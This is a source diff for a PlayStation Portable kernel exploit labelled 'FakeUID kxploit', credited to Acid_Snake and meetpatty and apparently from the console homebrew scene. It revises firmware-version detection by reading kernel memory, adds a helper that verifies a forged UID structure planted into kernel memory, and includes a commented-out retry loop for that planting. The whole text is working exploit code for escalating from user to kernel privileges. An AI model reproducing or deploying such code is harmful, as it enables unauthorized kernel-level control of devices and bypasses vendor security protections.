@@ -30,6 +30,8 @@ Put together by Acid_Snake and meetpatty.
 #define LIBC_CLOCK_OFFSET_360  0x88014D80
 #define LIBC_CLOCK_OFFSET_365  0x88014D00
 #define SYSMEM_SEED_OFFSET_365 0x88014E38
+#define SYSMEM_SEED_OFFSET_CHECK SYSMEM_TEXT+0x00002FA8
+
 #define FAKE_UID_OFFSET        0x80
 
 UserFunctions* g_tbl;
@@ -112,6 +114,12 @@ int stubScanner(UserFunctions* tbl){
     return 0;
 }
 
+int checkPlantUID(int uid){
+  u32 addr = 0x88000000 + ((uid >> 5) & ~3);
+  u32 data = readKram(addr);
+  return (data == libc_clock_offset - 4);
+}
+
 /*
 FakeUID kxploit
 */
@@ -119,12 +127,14 @@ FakeUID kxploit
 int doExploit(void) {
 
     int res;
+    u32 seed = 0;
+    
+    u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
 
-    u32 seed = readKram(SYSMEM_SEED_OFFSET_365);
-    if (!seed)
-      libc_clock_offset = LIBC_CLOCK_OFFSET_360;
+    if (test_val == 0x8F154E38)
+      seed = readKram(SYSMEM_SEED_OFFSET_365);
     else
-      PRTSTR1("Seed: %p", seed);
+      libc_clock_offset = LIBC_CLOCK_OFFSET_360;
 
     // Allocate dummy block to improve reliability
     char dummy[32];
@@ -133,12 +143,25 @@ int doExploit(void) {
 
     // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
     u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
-    SceUID uid = ((((dummyaddr - FAKE_UID_OFFSET) & 0x00ffffff) >> 2) << 7) | 0x1;
+    u32 newaddr = dummyaddr - FAKE_UID_OFFSET;
+    SceUID uid = (((newaddr & 0x00ffffff) >> 2) << 7) | 0x1;
     SceUID encrypted_uid = uid ^ seed; // encrypt UID, if there's none then A^0=A
 
     // Plant UID data structure into kernel as string
     u32 string[] = { libc_clock_offset - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
-    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)&string, PSP_SMEM_Low, 0x10, NULL);
+    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)(&string[0]), PSP_SMEM_Low, 0x10, NULL);
+
+    /*
+    while (!checkPlantUID(uid)){
+      // retry
+      newaddr += 4;
+      uid = (((newaddr & 0x00ffffff) >> 2) << 7) | 0x1;
+      encrypted_uid = uid ^ seed;
+      string[3] = encrypted_uid;
+      g_tbl->KernelFreePartitionMemory(plantid);
+      g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)(&string[0]), PSP_SMEM_Low, 0x10, NULL);
+    }
+    */
 
     g_tbl->KernelDcacheWritebackAll();
 
